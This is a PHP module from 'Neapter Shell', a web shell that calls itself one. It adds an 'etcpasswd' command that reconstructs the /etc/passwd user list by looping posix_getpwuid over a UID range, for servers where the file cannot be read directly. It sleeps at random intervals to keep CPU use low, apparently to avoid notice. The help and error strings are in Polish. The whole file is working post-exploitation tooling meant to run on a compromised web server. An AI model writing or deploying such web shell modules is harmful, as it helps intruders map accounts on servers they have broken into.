<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Get all users in system, if you cannot read /etc/passwd file directly
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleEtcPasswd extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('etcpasswd');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.1 2016-06-14 - <krzotr@gmail.com>';
    }

    /**
     * Execute module
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid

	Użycie:
		etcpasswd

		etcpasswd limit_dolny limit_górny

	Przykład:

		etcpasswd
		etcpasswd 1000 2000
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oUtils->isWindows()) {
            return 'Nie można uruchomić tego na windowsie';
        }

        if (!function_exists('posix_getpwuid')
            || in_array('posix_getpwuid', $this->oUtils->getDisabledFunctions())
        ) {
            return 'Funkcja "posix_getpwuid" nie istnieje';
        }

        $iMin = 0;
        $iMax = 65535;

        if ($this->oArgs->getNumberOfParams() == 2) {
            $iMin = (int) $this->oArgs->getParam(0);
            $iMax = (int) $this->oArgs->getParam(1);

            if (($iMin < 0) || ($iMin > 65535)) {
                return 'Błędny zakres dolny';
            }

            if (($iMin > $iMax) || ($iMax > 65535)) {
                return 'Błędny zakres górny';
            }
        }

        $sOutput = '';

        for ($i = $iMin; $i <= $iMax; ++$i) {
            if (($aUser = posix_getpwuid($i)) !== false) {
                $sOutput .= sprintf(
                    "%s:%s:%d:%d:%s:%s:%s\r\n",
                    $aUser['name'],
                    $aUser['passwd'],
                    $aUser['uid'],
                    $aUser['gid'],
                    $aUser['gecos'],
                    $aUser['dir'],
                    $aUser['shell']
                );
            }

            if ($i % 250 === 0) {
                /* Avoid 100% CPU usage */
                usleep(mt_rand(25000, 50000));
            }
        }

        return $sOutput;
    }
}
